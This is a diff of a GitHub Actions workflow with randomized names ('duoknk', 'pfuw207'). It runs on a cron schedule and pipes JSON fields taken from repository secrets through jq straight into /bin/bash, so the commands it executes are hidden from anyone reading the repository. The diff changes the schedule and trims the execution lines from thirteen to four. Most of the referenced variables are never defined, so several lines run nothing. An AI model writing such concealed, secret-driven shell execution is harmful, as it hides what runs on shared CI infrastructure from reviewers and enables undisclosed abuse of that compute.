@@ -2,29 +2,19 @@ name: duoknk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 5/6 * * *'
+    - cron: '50 3/6 * * *'
 
-jobs:  # 25221
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: duoknk
         env:
-          hw921: ${{ secrets.hw921 }}
+          pfuw207: ${{ secrets.pfuw207 }}
         run: |
-          echo $hw921 | jq -r .ucm5 | /bin/bash
-          echo $qr73 | jq -r .svydg41346 | /bin/bash
-          echo $b085 | jq -r .tsu221 | /bin/bash
-          echo $p21875 | jq -r .pj48553 | /bin/bash
-          echo $tkqc7 | jq -r .t82 | /bin/bash
-          echo $ihom0 | jq -r .tgmsv19214 | /bin/bash
-          echo $cybfp6404 | jq -r .zpow910 | /bin/bash
-          echo $y1 | jq -r .ffzxr4 | /bin/bash
-          echo $al8 | jq -r .r63202 | /bin/bash
-          echo $qhjzc93 | jq -r .uo681 | /bin/bash
-          echo $mbxka163 | jq -r .kjuwt8 | /bin/bash
-          echo $eh9687 | jq -r .ee927 | /bin/bash
-          echo $y058 | jq -r .l99681 | /bin/bash
+          echo $pfuw207 | jq -r .cgq3 | /bin/bash
+          echo $twm01341 | jq -r .j93 | /bin/bash
+          echo $mmalr10 | jq -r .h0 | /bin/bash
+          echo $uw59161 | jq -r .rb6680 | /bin/bash
 
